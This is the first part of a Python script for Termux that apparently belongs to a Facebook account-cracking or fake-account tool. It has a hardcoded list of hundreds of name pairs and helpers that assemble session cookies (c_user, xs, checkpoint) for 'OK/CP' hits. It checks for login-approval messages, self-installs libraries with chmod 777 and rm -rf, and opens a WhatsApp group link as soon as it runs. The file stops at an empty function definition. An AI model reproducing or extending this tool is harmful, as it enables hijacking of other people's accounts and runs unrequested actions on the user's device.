import os, json, time, re, random, sys, uuid, string, platform, base64
from concurrent.futures import ThreadPoolExecutor as thread
from io import BytesIO
from requests import Session as qss

#-> Installing pycurl and wget manually if its not installed by Farhan Ali<-#
try:
	import pycurl
except:
	arch = platform.architecture()[0]
	py_ver = ".".join(platform.python_version_tuple()[:2])
	py_path = f"/data/data/com.termux/files/usr/lib/python{py_ver}/"
	py_curl = "pycurl.cpython-311.so"
	os.system(f"mv {arch}/{py_curl} {py_path}")
	os.system(f"chmod 777 {py_path}{py_curl}")
	os.system("rm -rf 32bit")
	os.system("rm -rf 64bit")

try:
	import pycurl
except:
	print("pycurl error!\nContact Author")
	exit()

try:
	import requests
except:
	os.system("pip install requests")

try:
	from fake_email import Email
except:
	os.system("pip install fake_email")

import requests
from fake_email import Email

#-> Globals <-#
cp = 0
ok = 0
ok1 = 0
loop = 0
oks = []
cps = []
show_cp = True
show_cookies = True
twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
SEX= f"{random.choice(['Liger','METERED','MOBILE.EDGE' ,'MOBILE.HSPA','MOBILE.LTE','MODERATE'])}"
ses = requests.Session()
m = ['Aijaz|Ali', 'Zulfiqar|Ali', 'Kamran|Wassan', 'Shoaib|Shoaib', 'Muhbbat|Wassan', 'Rana|Waseem', 'Paras|Paras', 'Rana|Mohsin', 'Aliali|Aliali', 'Ali|Ali', 'Ghulam|Ghulam', 'Waqar|Lakho', 'Junaid|Chandia', 'Asif|Jan', 'Ali|Gulam', 'Malik|Saab', 'Rana|Zakir', 'Zameer|Ali', 'Irshad|Jan', 'Gulam|Shabir', 'Tariq|Rajput', 'Sajid|Ali', 'Shamshad|Ali', 'Mola|Bux', 'Awais|Rao', 'Shahbaz|Ali', 'Rana|Sahil', 'Khadam|Faqir', 'Mukhtiar|Magsi', 'Ghulam|Ali', 'Shah|Mohammed', 'Rawal|Ali', 'ستار|دادا', 'Abdul|Majeed', 'Mer|Muhammad', 'Ali|Rajput', 'Rana|Farman', 'Ahtisham|Rajput', 'Alideno|Khoso', 'Own|Rana', 'Suhail|Ahmed', 'Gulzar|Ahmed', 'Ahamd|Jam', 'Tasawar|Rajput', 'Fida|Qureshi', 'Shamshad|Rahu', 'سوشل|ميڍيا', 'Sheeraz|Abbasi', 'Bashir|Ustad', 'Zubair|Rao', 'Zafar|Ali', 'Yaqoob|Ali', 'M|Soomar', 'Altaf|Hussain', 'Bahadur|Ali', 'Farman|Ali', 'Waris|Ali', 'Rana|Qurban', 'Muhammad|Khan', 'Asad|Asad', 'Sartaaj|Sartaaj', 'Rana|Kabir', 'Rana|Abdul', 'Ghulam|Hussain', 'Kirshan|Kumar', 'Adil|Rajpoot', 'Sahoowal|Sahoowal', 'عبد|الجبار', 'Imran|Ali', 'Faz|Mahammad', 'Safeel|Nawaz', 'ريا|ض', 'Haroon|Rana', 'Amjad|Ali', 'Kashii|Rajpoot', 'Junejo|Sahib', 'Altaf|Pahore', 'Ali|Rajput', 'Zeeshan|Ali', 'Muhammad|Muktiar', 'Iftikhar|Ahmand', 'Shahzeb|Ali', 'Faiz|Jutt', 'Chanesar|Khan', 'Ali|Shar', 'Zuhair|Ahmed', 'محب|علی', 'Siraj|Khaskheli', 'Rana|Dilshad', 'Ghazanfar|Ali', 'Rao|Awais', 'Jaan|Jaan', 'Syed|Junaid', 'Abdul|Ghaffar', 'Kirshan|Kumar', 'ابومحمد|احمد', 'Nisar|Hussain', 'Nasir|Dahri', 'Hakim|Khan', 'Ahsan|Raza', 'Nadir|Rind', 'Sålmàñ|Çh', 'GhulamNabi|Khaskhali', 'Umar|Lal', 'NabeelHy|Ka', 'Dilshad|Magsi', 'Haaji|Anwar', 'Nisar|Ahmed', 'Barkat|Ali', 'Irfan|Ali', 'Aslam|Khan', 'Hashim|Khoso', 'Abdul|Malik', 'Masroor|Zardari', 'Rao|Bilal', 'Nisarkhoso|Nisarkhoso', 'مرجع|الناطق', 'Sajawal|Rajput', 'Rana|Muhammad', 'Rana|Dilshad', 'Rana|Imran', 'Daniyal|Kazmi', 'Faqeer|Baboo', 'Azan|Jan', 'Gul|Hassan', 'Nadir|Jan', 'NadeemRind|Rind', 'Angel|Rodriguez', 'Allahbux|Rang', 'Ghullam|Muhammad', 'Talib|Hussain', 'Abid|Ali', 'Rana|Noushad', 'Ghulam|Hussain', 'Samir|Samir', 'Shahid|Rana', 'Janib|Janib', 'Maria|Albuquerque', 'Rana|Qasim', 'Faizan|Ali', 'Ali|Gul', 'Madeji|Power', 'Rajput|Faisal', 'Mansoor|Sahito', 'Ali|Dero', 'Razaq|Khaskheli', 'Muneer|Ali', 'Imran|Ali', 'Sakhawat|Ali', 'Khadim|Baloch', 'Rana|Taswar', 'Raouf|Chadhar', 'Umar|Shahzad', 'Shah|Mir', 'Irfsn|Irfsn', 'Abbas|King', 'Aftab|Ali', 'M|Raju', 'Ghulam|Mustafa', 'Gul|Sher', 'Nazim|Hussain', 'Malik|Jawed', 'Deedar|Hussain', 'Maham|Khan', 'Junaid|Rajput', 'Sawan|Ali', 'Sajwal|Rao', 'Ayaz|Ali', 'Irfan|Irfan', 'Hut|Khan', 'Ana|Mendez', 'Shakeel|Khosa', 'Javed|Javed', 'Dil|E', 'Rana|Adil', 'Rahil|Ali', 'Innayat|Ali', 'Aijaz|Abbasi', 'Jamil|Jan', 'Fidah|Khoso', 'Rana|Abdul', 'Rana|Junaid', 'Malik|Sajid', 'Ghulam|Ali', 'Ahsan|Ali', 'Imtiaz|Ali', 'Islam|Baloch', 'Hashim|Khoso', 'Sattar|Buledi', 'Nanik|Ram', 'Gul|Wali', 'Rahman|Khan', 'Ali|Hassan', 'Sooraj|Kumar', 'GhulamAbbas|Channa', 'Muhammad|Saleh', 'Ali|Ali', 'Ayazaliayaz|Ayazaliayaz', 'Asif|Baloch', 'Mujeeb|Bds', 'Rana|Mustak', 'Ali|Rind', 'Amjad|Ali', 'سلامدين|سلامدين', 'Himat|Ali', 'Amanullah|Abro', 'Shookat|Ali', 'Mushoque|Malokhani', 'Zulifqar|Ali', 'Fareed|Abro', 'Zuhaib|Ali', 'Rasmyh|Rasmyh', 'Zubair|Ali', 'Waheed|Ali', 'Mohsin|Shaikh', 'Muzamil|Rajput', 'Gul|Bahar', 'Zaffar|Khoso', 'Akram|Ali', 'Rana|Sajids', 'Noor|Highlights', 'Basher|Baloch', 'Musam|Aill', 'Jamshed|Rana', 'علی|مولا', 'Hero|G', 'Rematullha|Rajpoot', 'Ustad|Hanif', 'Zubair|Ali', 'Rana|Abdul', 'Kamran|Ali', 'Kosar|Vighamal', 'Mansoor|Ali', 'Nadeem|Raza', 'Niaz|Hussan', 'Awais|Malik', 'Ammar|Shoz', 'Atta|Mohmad', 'Naeem|Khan', 'Sanju|Bhai', 'Waseem|Abass', 'Ghulam|M', 'Muhammad|Urs', 'Zahid|Hussain', 'Rana|Rajput', 'Meer|Jan', 'Waris|Ali', 'Inayat|Np', 'Sher|Muhhammd', 'Rana|Muzfar', 'Beni|Solis', 'Suba|Ali', 'Umesh|Kumar', 'Basit|Kahout', 'Rafiq|Khaskali', 'Saira|Khan', 'Rizwan|Ali', 'Shahbaz|Ali', 'Ail|Aagsr', 'M|Rafiq', 'Alom|Alahaj', 'Muhmmad|Waris', 'Sameer|Ali', 'Rana|Qaser', 'Fkgkodfj|Xkxnxuc', 'Saijad|Ali', 'Nadeem|Jan', 'Ajkhoso|Ajkhoso', 'Huzaifa|Ansari', 'Mazhar|Abbas', 'Molaa|Bux', 'Mashuq|Ali', 'Aneel|Kumar', 'Zahid|Hussain', 'Alihyder|Kalhoro', 'Rana|Rana', 'Bashir|Ahmed', 'Khalid|Hussein', 'Mumtaz|Ali', 'Arif|Memon', 'Ayoub|Baloch', 'Tehmoor|Ali', 'Imran|Ali', 'Shamshad|Ali', 'Ghulam|Hussain', 'Sajjad|Panhwar', 'Mole|Deno', 'Farooq|Bhaijan', 'Israr|Jakhrani', 'Imtyaz|Ali', 'Adeel|Masih', 'Gull|Hassan', 'Tando|Adam', 'منظور|راهو', 'Rana|Rehman', 'Mamtaz|Sehto', 'Amjid|Ali', 'Rana|Mubashir', 'Hamidullah|Mangsi', 'Ghulam|Nabi', 'Ahmed|Ali', 'Syedjaved|Shah', 'Rao|Hassan', 'Papoo|Kumar', 'Mehtab|Ali', 'Rana|Kashif', 'Rana|Wnus', 'Farman|Ali', 'Zulifiqar|Zulifqar', 'Sadam|Chandio', 'Mitho|Mallah', 'کاشف|راجپوت', 'Shamshaad|Rahoo', 'Hajan|Abbasi', 'Muneer|Zaib', 'Ayaz|Ayaz', 'Zain|Ali', 'Ghulam|Muhammad', 'Rao|Bilal', 'Babu|Khan', 'Rana|Ikram', 'Rana|Nasir', 'Amen|Rajpot', 'Fardeen|Panhwar', 'نگاھ|حبيب', 'Nadeem|Ali', 'Najaf|Ali', 'عمران|عباسی', 'Sahil|Shah', 'Ali|Hassan', 'Sonu|Jani', 'Ajmal|Abbasi', 'Abn|Rajab', 'Imtiyaz|Yousufzai', 'Dildar|Ali', 'Adil|Rao', 'Badshah|Yt', 'Sawan|Ali', 'Ali|Ahmed', 'Amir|Ali', 'Amjad|Ali', 'Shahid|Khan', 'Siama|Khan', 'Gulam|Shabir', 'Tehmoor|Hassan', 'Ghulam|Ali', 'Masum|Ali', 'Dedar|Ali', 'Shani|Jutt', 'Rintu|Kumar', 'Sikandar|Shah', 'Furqan|Jutt', 'Rahil|Ali', 'Rana|Shehzad', 'Nisha|Kumari', 'Jamshed|Khan', 'Zawar|Safdar', 'Murtaza|Ali', 'Muhammad|Aijaz', 'Punhal|Ali', 'Bisharat|Mirbahar', 'Xtylíśh|Shahmir', 'نصيراحمد|ميمڻ', 'Darya|Khan', 'Imdad|Khoso', 'Allyas|Allyas', 'Amjad|Ali', 'Bhatti|G', 'Faizan|Aziz', 'Rashad|Baloch', 'Abdul|Jabar', 'Rana|Shafiq', 'Hamadullah|Lakho', 'Ziafat|Khan', 'Faqeer|N', 'Rana|Ibrar', 'Shafi|Muhmmad', 'Awees|Ali', 'Amir|Ali', 'Ali|Khan', 'QaMar|ZaMan', 'Rana|Naveed', 'فرینا|فرینا', 'Ghul|Sher', 'Safeer|Khaskhali', 'Rana|Asim', 'Farhan|Ali', 'Ghulam|Abbas', 'Zulfiqar|Ali', 'Zakir|Ali', 'Rhman|Ali', 'Rana|Ali', 'Muneer|Khan', 'Mumtaz|Ali', 'Nadeem|Ali', 'Zameer|Shah', 'Faheem|Ahmad', 'Pordip|Mandal', 'Shahzaib|Rahman', 'Zidi|Bacha', 'Waqar|Rajput', 'Ali|Akbar', 'Ali|Raza', 'Sabir|Ali', 'Rana|Qurban', 'Ali|Bahte', 'Sajad|Ali', 'Ahadattaullah|Malik', 'Muzammil|Hussain', 'Jan|Muhammad', 'Fasial|S', 'Ameer|NaNa', 'Makro|Sharif', 'Mithal|Khaskheli', 'محمدموسا|محمدموسا', 'Mitho|Mallah', 'Muzzamil|Ali', 'Ahmad|Hassan', 'Babar|Babar', 'Zawar|Muhammad', 'Rana|Nadir', 'Mazhar|Ali', 'Rana|Irfan', 'Bilal|Abbasi', 'Ghulam|Jaffar', 'Asif|Rana', 'Mœhäməd|Řhæ', 'M|Nawaz', 'Farooq|Ali', 'Ashfaq|Rahoo', 'Azmat|Ali', 'Mateen|Rana', 'Shan|Ali', 'Çhårîyē|Çhøkrī', 'Parwez|Ali', 'Azhar|Hussain', 'Shahabaz|Ali', 'Syed|Ghot', 'Zahid|Hussain', 'Mir|Babu', 'Zarik|M', 'Shakel|Ansari', 'Hafiz|Imran', 'Shah|Zaib', 'Bilal|Jan', 'Asif|Asif', 'Asif|Asif', 'Muzafar|Rajbut', 'Makhdoom|Ghulam', 'Rana|Farooq', 'Gulam|Yaseen', 'Ashiqe|Jatt', 'Arshad|Brohi', 'Nazeer|Ahmed', 'Sajad|Ali', 'Mircho|Mal', 'Rana|Junaid', 'Lakho|Mal', 'Sajid|Ali', 'Raees|Rahat', 'Irfan|Ali', 'Rana|Imran', 'Ali|Mughal', 'Riaz|Khan', 'Ahsan|Bozdar', 'Shahidalisolangi|Shahidalisolangi', 'Tariq|Tariq', 'Rao|Nasir', 'Zahid|Ali', 'Shahzad|Madni', 'Sarfaraz|Rahu', 'Mubashair|Rana', 'Ahsan|Khoso', 'Jalger|Bhatti', 'Rana|Wajid', 'Lala|Aziz', 'Shakir|Abbasi', 'Ali|Asgar', 'Ruble|Hasan', 'Abdul|Rehman', 'Azizullah|Soomro', 'Abbas|Ali', 'Muhammad|Ali', 'Rana|Wajid', 'Rana|Musharaf', 'Rashid|Qureshi', 'Shahmeer|Chandio', 'Shan|Ali', 'Ahmed|Qureshi', 'Zaheer|Abbas', 'Imran|Ali', 'Asif|Khan', 'Shahid|Ali', 'Mangii|Mangii', 'Momin|Ali', 'Meer|Shan', 'Muqu|Poiro', 'Umar|Shahzad', 'Waris|Ali', 'Numwar|Ali', 'Muhammad|Tahir', 'AKhtar|Ali', 'Rana|Sajid', 'Sarfarazmemon|Attad', 'Salim|Junejo', 'Mashque|Ali', 'Hassnan|Ali', 'Irfan|Ali', 'Adv|Ali', 'Himmat|Ali', 'Khalid|Jamil', 'Mohsin|Rajput', 'Syed|Nadir', 'Raheem|Punho', 'Rana|Abdullah', 'Rana|Noaman', 'Mansoor|Solangi', 'Imran|Jaan', 'Waris|Ali', 'Rana|Mubasher', 'Mujahid|Ali', 'Hussnain|Rajpoot', 'Chaudhary|Abdul', 'Haider|Baloch', 'Ali|Dino', 'Mir|Khan', 'Irfan|Fatima', 'Arshad|Baloch', 'Shakir|Abbasi', 'Naveed|Rind', 'Gul|Muhammad', 'Meer|Murtaza', 'Papo|Papo', 'Nisar|Ali', 'Gbhs|Bhit', 'Sadoro|Jan', 'Rana|Moon', 'Ramzan|Jan', 'Rana|Zakir', 'Rao|Waqas', 'M|Waqas', 'Rana|Rana', 'Rukhsar|Haidry', 'RaNa|BOby', 'M|Juman', 'Sadiq|Ali', 'Manik|Khan', 'Ran|A', 'Ghulab|Hussain', 'Ronaq|Ali', 'Tarique|Ali', 'Abdul|Qadir', 'Zawar|Sohana', 'Mehran|Rajput', 'Sikandar|Ali', 'Ãtîf|Â', 'Meer|Shahzeb', 'Sajjad|Abbasi', 'Rana|Naeem', 'Bashir|Ahmed', 'Rafeh|Rajpoot', 'ẞk|KhÄñ', 'Imtiaz|Khoso', 'Alex|Shahzad', 'Aman|Abbasi', 'Mehran|Rajput', 'Raja|Rajpot', 'Bahdur|Ali', 'Hammad|Ali', 'Salman|Salman', 'Shahzad|Shahzad', 'AtaullAh|Khan', 'Rafique|Mirani', 'Arbab|Ali', 'Nisar|Ali', 'Zahid|Hussain', 'Rana|Shahzad', 'Rana|Ramzan', 'Noro|Mohmad', 'Riaz|Rajput', 'Mahbat|Khan', 'Ahsan|Ali', 'Rana|Ikram', 'Qamar|Abbas', 'Jahanzib|Ali', 'Rana|Sunny', 'Rao|Yasir', 'Muhammad|Mithal', 'Ashiq|Hussain', 'Ha|Ni', 'Abdul|Latif', 'Meer|Mortaz', 'Meer|Zohaib', 'Zahid|Bhatti', 'Awais|Rajput', 'Ali|Bux', 'Abdul|Hakeem', 'Hassnain|Muavia', 'Syed|Junaid', 'Riaz|Machi', 'Ahsan|Abro', 'Hyder|Ali', 'Sattar|Sattar', 'Sayed|Sharafat', 'Syed|Bilalarif', 'Lal|Muhmmad', 'Mohsin|Ali', 'Asif|Ali', 'Juleed|Shah', 'Hayat|Khan', 'Ali|Bux', 'पवन|अल्लापुर', 'Ghulam|Nabi', 'Zaheer|Ali', 'Soomar|Bughio', 'Madad|Ali', 'Naeem|Chohan', 'Javed|Javed', 'Waseem|Raza', 'Saorg|Khan', 'Zeeshan|Zeeshan', 'Aliza|Chaudhary', 'Rana|Shuaib', 'Ali|Khan', 'Rao|Shabbir', 'Commandos|King', 'Arshad|Sli', 'Rana|Shahrukh', 'Ratan|Kumar', 'Umar|Khan', 'Ali|Bhnoo', 'Shahzaib|Shah', 'Aqib|Gakhar', 'Rana|Ishaq', 'Bilal|Rajput', 'Asif|Khan', 'Hazrat|Hussain', 'Zohair|Ali', 'Parvez|Ali', 'Altaf|Hussain', 'Mashooq|Ali', 'Dilshad|Magsi', 'Gulam|Mustafa', 'Safdiar|Khan', 'Tofiq|Khan', 'Sudheer|Ahmad', 'Suhrab|Pardesi', 'Syed|Badshah', 'Ashok|Kumar', 'Ssbri|Chandio', 'Yaseen|Ali', 'Rimsha|Shehzadi', 'Meer|Aamir', 'Lakhiar|Adeel', 'Ariz|Muhammad', 'عبداللہ|کوھارو', 'Yameen|Ali', 'Sahil|Gadehi', 'Sahab|Ali', 'Naimatullah|Ali', 'Baqir|Sajjad', 'مير|حارث', 'M|Slutan', 'Sadaqat|Ali', 'Fahad|Ali', 'Muhammed|Shabeer', 'Khalifo|Chandio', 'Zohaib|Ali', 'Ab|Ghani', 'Ibrahim|Baloch', 'Rehmatullah|Mastoi', 'Mohammed|Younis', 'Shahzadi|Kiran', 'Ahmad|Khan', 'Arshad|SooMro', 'Sadam|Solangi', 'Yamen|Ali', 'Majid|Khan', 'Ab|Aziz', 'Sabir|Khuharo', 'Nazeer|Chandio', 'Md|Samer', 'Kaif|Qureshi', 'MuHammad|HaaDi', 'Altaf|Khan', 'Majid|Ali', 'Muhammad|Abraim', 'Noor|Ahmed', 'Abid|Hussain', 'Ashraf|Buriro', 'Rajib|Ali', 'Ahsan|Ali', 'Aakash|Khuharo', 'Hassan|Ali', 'Awaiz|Memon', 'Asharf|Malah', 'Muslim|Chandio', 'Haji|Saddam', 'Rashid|Ali', 'Assadullah|Kolachi', 'Kashif|Ali', 'Irfan|Ali', 'Zulfqar|Soomro', 'Ghafar|Chandio', 'Younis|Ali', 'Meer|Murtiza', 'Majahd|Ali', 'Rao|Arslan', 'Rana|Tsawar', 'Akbar|Rajput', 'Rana|Yasir', 'Rana|Waqar', 'Rana|Umer', 'Rao|Zeeshan', 'Rana|Aqib', 'Rana|Mudassar', 'Rana|Zubair', 'Rana|Zohaib', 'Rana|Rana', 'Rao|Shoaib', 'Nokhaiz|Rao', 'Rana|G', 'Saeed|Somro', 'Rana|Muklish', 'Muzamil|Rajput', 'Râõ|Zêshãñ', 'Rana|Nasrullah', 'Rana|Naveed', 'Hamza|Rajpoot', 'Rana|Naveed', 'Rana|Zahid', 'Rao|Ali', 'Rao|Ishfaq', 'Ehsan|Rana', 'Ahsan|Rana', 'Mohammed|Akmal', 'Rana|Naeem', 'Rana|Ahmad', 'Rana|Shani', 'Rao|Nasir', 'Rao|M', 'Rana|Imran', 'Rao|Arshad', 'Rao|Sanaullah', 'Ali|Rana', 'Rao|Muhammad', 'Rana|Gulraiz', 'Salal|Rajput', 'Rana|Muhammad', 'Ijaz|Rajpoot', 'M|Farman', 'Rao|Raees', 'Rana|Umar', 'Umair|Rana', 'Shafiq|Rajpoot', 'Rana|Numan', 'Rao|Shb', 'Rana|Yousif', 'Rana|Liaqat', 'Rana|Asad', 'Zafar|Rajpoot', 'Rao|Hamza', 'Abubakar|Rajput', 'Rao|M', 'Rana|Ishaq', 'Waqas|Rajpoot', 'Amir|Sohail', 'Rao|Sohaib', 'Rana|Shazil', 'Rao|Bilal', 'Rao|Altaf', 'Rao|Nabeel', 'Hamza|Rao', 'Asif|Rana', 'Rana|Umair', 'Raokashif|Ali', 'Rao|Qaiser', 'Rana|Attual', 'Rana|Shabaz', 'Rao|Salman', 'Rao|Samad', 'Rao|Shoaib', 'Rana|A', 'Rao|Kashif', 'Rao|Zarar', 'Rana|Tayyub', 'Raja|Kamal', 'Amir|Rajput', 'RaoAlizaman|RaoAlizaman', 'Hamza|Rao', 'Rana|Falak', 'Sikandar|Khan', 'Rao|Shahbaz', 'Rana|Talha', 'Kashif|Rajpoot', 'Hammad|Rana', 'Hamza|Rao', 'Roa|Zahid', 'Rana|Hamza', 'Rao|Saleem', 'Rao|Faryad', 'Rao|Abubakar', 'Bilal|Rajput', 'Rao|Waseem', 'Sonu|Rao', 'Rana|Rizwan', 'Bilal|Rao', 'Rans|Maqsood', 'Rana|Furqan', 'Rao|Ali', 'Rana|Muzamil', 'M|Asif', 'Rao|Sohail', 'Rana|Bahadur', 'Rana|Muhmmad', 'Shahzada|Gs', 'Rao|Farhan', 'Zahgim|Ali', 'Abaid|Raja', 'Rana|Waseem', 'Rana|Ajmal', 'Rao|Latif', 'Rao|Aqib', 'Rana|Ramzan', 'Wajid|Rana', 'Sabir|Rajpoot', 'Rana|Shehryar', 'Rana|Yaqub', 'Rao|Abdul', 'Rajput|Sab', 'Rana|Tasawar', 'Rana|Waseem', 'Rana|Babar', 'Rana|Shahid', 'Rana|Maviya', 'Rana|Saeed', 'Waheed|Rajput', 'Junaid|Rajpoot', 'Rao|Saqib', 'Rao|Azeem', 'Rana|Ali', 'Muhammad|Nadeem', 'Rana|Majid', 'Rana|Sahab', 'Abubakar|Jatoi', 'Sabir|Dogar', 'Ameen|Rana', 'Rana|Shakeel', 'Rao|Tasleem', 'Pʀɩŋcɘ|Nʌsɩʀ', 'Rana|Mani', 'Rana|Jee', 'Zidi|Rana', 'Rana|Kamran', 'Rana|Zabi', 'Mehtab|Rao', 'حسن|راو', 'Rana|Sajid', 'Rao|Aftab', 'Rana|Muhammad', 'Muhammad|Muhammad', 'Rao|Abdulrazaq', 'Rao|MubeenRao', 'Rao|Nazeer', 'Rana|Adnan', 'Rana|Alishan', 'Rana|Wahab', 'Rao|Ali', 'Rana|Rashid', 'Rana|Waqar', 'Dilawar|Rao', 'Rana|Iftkhar', 'Shami|Rana', 'Rana|Hamza', 'Rana|Luqman', 'Rao|Haseeb', 'Rana|Waseem', 'Rana|Abid', 'شہری|راجپوت', 'Rao|Mohammad', 'Rana|Rashid', 'Rana|Hamza', 'Tariq|Javid', 'Rao|Ahtsham', 'Rana|Tauqeer', 'Rao|Zeeshan', 'Ahad|Rajpoot', 'M|Muzamil', 'Rana|Zaid', 'Rana|Asad', 'Usama|Rana', 'Rana|Ali', 'Rana|Sajid', 'Rana|Tokeer', 'Rana|Mikro', 'Rana|Rana', 'Raza|Jafri', 'Rana|Kamran', 'Rao|Sharafat', 'Rana|Awais', 'Rana|Arslan', 'Rana|Qazafi', 'Rana|Waqar', 'Flk|Sher', 'Rana|Danish', 'Rana|Mudassar', 'Rana|Khalid', 'Rana|Nadeem', 'Adil|Rao', 'Rana|Tahseen', 'Rao|Tayyab', 'Rao|Waseem', 'Rana|Faheem', 'Rao|Khaleeq', 'Ali|Adnan', 'Rao|Ikhtiar', 'Rao|Jani', 'Rao|Amir', 'Farman|Rao', 'اشتہاری۔راجپوت|اشتھری۔راجپوت', 'RanaAli|Rana', 'Rao|Shoaib', 'Raozain|Raozain', 'Sajawal|Rajpoot', 'Rana|Tanveer', 'Rao|Aqib', 'Rana|Ehsan', 'Rao|Zubair', 'Rajpoot|Zeeshan', 'Ahsan|Rana', 'Rao|Saad', 'Safdar|Rana', 'Rana|Mubeen', 'Räñâ|Umäir', 'Rao|Jani', 'Rana|Ibrar', 'Rao|Amir', 'Rana|Asif', 'Hussnain|Qureshi', 'Abdullah|Somroo', 'Rana|Nabeel', 'Rana|Gulfam', 'Babar|Rao', 'Zubair|Rao', 'Abubakar|Rao', 'Rana|G', 'Rana|Shair', 'Rana|Haris', 'Rao|Tariq', 'Zain|Rao', 'Muhammad|Qadeer', 'Rao|Naveed', 'Rizwan|Rao', 'Sajid|Ali', 'Rao|Munir', 'Rana|Afaq', 'Rajput|Brand', 'Rao|Hassan', 'Rana|Saim', 'Mukhtiyar|Khan', 'Rana|Sarfraz', 'Rana|Naveed', 'Rana|Faizan', 'Usama|Rana', 'Muzammil|Rao', 'Rahman|Dogar', 'Rana|Danish', 'Rao|Shahryar', 'Rana|Shahzad', 'Naqeeb|Rao', 'Anss|Rana', 'Subhan|Rana', 'عبدالرحمان|راؤ', 'R|A', 'Ch|Asad', 'Nadeem|Rao', 'Raja|Nawaz', 'Rana|Iqbal', 'S|Rao', 'Rana|Maqsood', 'Rao|Qasim', 'Rana|Zahid', 'راؤ|عرفان', 'M|Jamshed', 'Rao|Imran', 'Shahzad|Rajpoot', 'Rana|Shahzaib', 'Muhammad|Sikandar', 'راناعامر|راناعامر', 'Rao|Hasnain', 'Rana|Asif', 'Javed|Rana', 'Raoiqrar|Raoiqrar', 'Zaheer|Rana', 'Mudassir|Rajput', 'Rana|Awais', 'Rao|Waseem', 'Ali|Rao', 'Rao|Asif', 'Haseeb|Rajput', 'Rana|Rizwan', 'Rana|Shuaib', 'Rana|Shoaib', 'Rao|Shoaib', 'Rajpoot|Arslan', 'Rao|Muzammil', 'Rana|Rashid', 'Rana|Shahbaz', 'Rao|Inaam', 'رانا|ندیم', 'Arslan|Rao', 'Rana|Shakeel', 'Zeeshan|Rana', 'Rana|Mansoor', 'رانا|عاطف', 'Bilal|Prince', 'Rana|Shokat', 'Rana|Babar', 'M|Jafar', 'Ranaiqrar|Ranaiqrar', 'Rao|Imran', 'Rao|Arif', 'Fatima|Rajpoot', 'Nomii|Rajput', 'Rao|Junaid', 'Hasnaat|Rajput', 'Rao|Haleem', 'عبداللہ|راجپوت', 'Shoiab|Rana', 'رانا|دانی', 'Rao|Tasawar', 'Sunny|Rao', 'ᎷᎥᏗᏁ|ᏕᏬᏝᏖᏗᏁ', 'Sajjad|Rao', 'Sardar|Ijaz', 'Rao|Akbar', 'Rana|Usama', 'Mujahid|Khanbadani', 'Rao|Amjid', 'Rana|Ahsan', 'Rana|Akram', 'Adnan|Rana', 'Imran|Ashraf', 'Rajab|Rajput', 'Rao|Shakir', 'Rana|Usman', 'رانا|ارسلان', 'رضا|سعید', 'Rao|Tariq', 'Saad|Rajpoot', 'Parvaiz|Parvaiz', 'Rana|Dilo', 'Rana|Rashid', 'Rana|Asif', 'Rao|Ali', 'Sultan|Rao', 'Rana|Umair', 'Rao|Saad', 'Rao|Farhan', 'Rana|Babar', 'Raja|Sahib', 'Umer|Wakeel', 'Rao|M', 'Arslan|Rao', 'Rao|Mudassar', 'Rajpoot|Ramzanrajpoot', 'Wasim|Rao', 'Bilal|Rana', 'Shahbaz|Rajpoot', 'M|Asif', 'Rana|Aftab', 'Usama|Rao', 'Rao|Abdul', 'Amir|Sohail', 'Rafiq|Khan', 'Rao|Tanveer', 'Rana|Fahim', 'Rana|Afaq', 'Rana|Jabbar', 'Rana|Zain', 'Rao|Talha', 'Ahmad|Raza', 'M|Rao', 'Brand|Rao', 'Rao|Waseem', 'Rana|Zeshan', 'Adeel|Khalil', 'Rana|Ahamd', 'Rana|Sajid', 'Rana|Bilal', 'Rao|Amir', 'Rao|Asif', 'Farhad|Rao', 'Rao|Kashif', 'Ibrar|Rajput', 'Rao|Aftab', 'Muhammad|Ali', 'Rao|Ali', 'Hassan|Rajput', 'Rao|Mazhar', 'Rao|F', 'Sijawal|Rana', 'Rana|Intizar', 'Rana|Husnain', 'Rao|Babar', 'Rana|Uzair', 'عثمان|احمد', 'Rana|Ali', 'Rana|Waseem', 'Rana|Rehan', 'Rana|Ahmad', 'Rao|Touqeer', 'Rana|Shahid', 'Rao|Abid', 'Azeem|Rao', 'Rana|Imran', 'Rana|Asgher', 'Rao|Raza', 'Rana|Hussain', 'Rao|Shahryar', 'Rao|G', 'Nouman|Rajpoot', 'Rao|Faisal', 'Rao|Saim', 'Rana|Shahid', 'Rana|Adnan', 'Usman|Usman', 'Rajpoot|Putter', 'Hafiz|Ahtsham', 'Rana|Nadeem', 'Moon|Rao', 'Shana|Rao', 'Rao|Fakhar', 'Rana|Imran', 'Rajpoot|Sufyan', 'Malik|Fiaz']

ua1 = ""
ua2 = ""
ua3 = ""
uar = ""
version = ""
locale = ""

#-> Colors <-#
RED = '\033[1;91m'
WHITE = '\033[1;97m'
ORANGE ='\x1b[38;5;208m'
YELLOW = '\033[1;33m'
GREEN = "\033[1;32m"
WHITE_BOLD = "\033[1;37m"
BLUE = '\033[1;34m'
CYAN = "\033[1;36m"
RED_BG = "\33[37;41m"
RESET = "\033[0;m"

#-> Get "=" according to screen size (by Farhan Ali) <-#
def eqs():
	return "="*os.get_terminal_size()[0]

#-> Open WhatsApp <-#
os.system('xdg-open https://chat.whatsapp.com/CEHRh9G4CMHFpv6AnSmQqj')

#-> Functions <-#
def cvt(st,ran):
	try:
		if st == 'ok':
			cookie = ('c_user=%s;xs=%s;fr=%s;datr=%s;'%(ran['c_user'],ran['xs'],ran['fr'],ran['datr']))
		elif st == 'cp':
			cookie = ('checkpoint=%s;datr=%s;fr=%s;'%(ran['checkpoint'],ran['datr'],ran['fr']))
	except:
		cookie = '; '.join([str(x)+"="+str(y) for x,y in ran])
	
	return cookie

def dec(t):
	return base64.b64decode(t).decode()

rnd = random.randint

def find(txtt,wrd):
	return re.findall('name="'+wrd+'" value="(.*?)"',txtt.replace("amp;",""))[0]

def linex():
	print(WHITE_BOLD+("\033[1;93m■\033[1;97m"*os.get_terminal_size()[0]))

def cleanUid(text):
	return re.sub(r'[^a-zA-Z0-9#]', '', text)

def process_completed():
	global oks, cps
	print(WHITE_BOLD)
	linex()
	print(' THE PROCESS HAS COMPLETED')
	print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
	linex()
	input(' PRESS ENTER TO BACK ')
	menu()

#-> Random UserAgents <-#
def random_ua():
